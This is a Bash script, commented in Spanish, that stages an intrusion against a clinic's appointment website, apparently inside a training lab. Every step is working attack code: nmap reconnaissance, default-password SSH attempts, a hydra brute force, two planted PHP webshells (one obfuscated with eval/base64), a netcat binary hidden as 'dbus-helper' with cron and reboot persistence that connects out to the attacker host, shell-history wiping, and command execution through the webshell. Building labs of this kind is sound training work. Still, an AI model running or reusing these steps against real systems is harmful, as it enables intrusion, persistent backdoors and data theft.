#!/bin/bash
# El ataque del bloque B, DE VERDAD, desde la máquina «atacante» (198.18.40.66) contra la web de citas de la clínica.
# Lo lanza ./lab.sh incidente. Todo lo que se ve después en la web (registros, ficheros, procesos) es real.
#   1. Mira la web y prueba la puerta del SSH
#   2. Fuerza bruta contra el usuario «citas» con un diccionario (hydra)
#   3. Entra, deja dos webshells, un «regalo» y una puerta trasera que se reinicia sola
#   4. Usa la webshell desde fuera
set -u
WEB=198.18.40.10
echo "1/4 · Reconocimiento"
curl -s -o /dev/null "http://$WEB/"
curl -s -o /dev/null "http://$WEB/robots.txt"
nmap -Pn -n -p 22,80 "$WEB" >/dev/null 2>&1
for u in admin root; do
  sshpass -p "admin" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR -o ConnectTimeout=5 "$u@$WEB" true 2>/dev/null
done
sleep 3

echo "2/4 · Fuerza bruta contra el SSH (usuario citas)"
CLAVE=$(hydra -l citas -P /usr/share/lab/diccionario.txt -t 4 -f -q "ssh://$WEB" 2>/dev/null \
        | sed -n 's/.*password: \(.*\)$/\1/p' | head -1)
[ -n "$CLAVE" ] || { echo "   ✘ hydra no ha encontrado la contraseña"; exit 1; }
echo "   encontrada"
sleep 4

echo "3/4 · Dentro: webshells, regalo y puerta trasera"
pgrep -f "nc -lk 8443" >/dev/null || (nohup nc -lk 8443 >/dev/null 2>&1 &)
sshpass -p "$CLAVE" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR "citas@$WEB" bash -s <<'EOS'
cd /var/www/html/uploads
printf '%s\n' '<?php' '// visor de radiografías' 'if (!empty($_REQUEST["c"])) { passthru($_REQUEST["c"]); }' '?>' > radiografia.php
printf '%s\n' '<?php' '@eval(gzinflate(base64_decode($_POST["x"])));' '?>' > .thumbs.php
printf '%s' 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > presupuesto-1207.pdf
mkdir -p /var/tmp/.font-unix && cp /usr/bin/nc /var/tmp/.font-unix/dbus-helper
( crontab -l 2>/dev/null; echo '*/3 * * * * /var/tmp/.font-unix/dbus-helper -d 198.18.40.66 8443 >/dev/null 2>&1'; \
  echo '@reboot /var/tmp/.font-unix/dbus-helper -d 198.18.40.66 8443 >/dev/null 2>&1' ) | crontab -
nohup /var/tmp/.font-unix/dbus-helper -d 198.18.40.66 8443 >/dev/null 2>&1 &
history -c
EOS
sleep 4

echo "4/4 · Usa la webshell desde fuera"
for c in id hostname "ls /home"; do
  curl -s -o /dev/null -A "Mozilla/5.0" "http://$WEB/uploads/radiografia.php?c=$(printf %s "$c" | sed 's/ /%20/g; s#/#%2F#g')"
  sleep 1
done
echo "Ataque terminado."
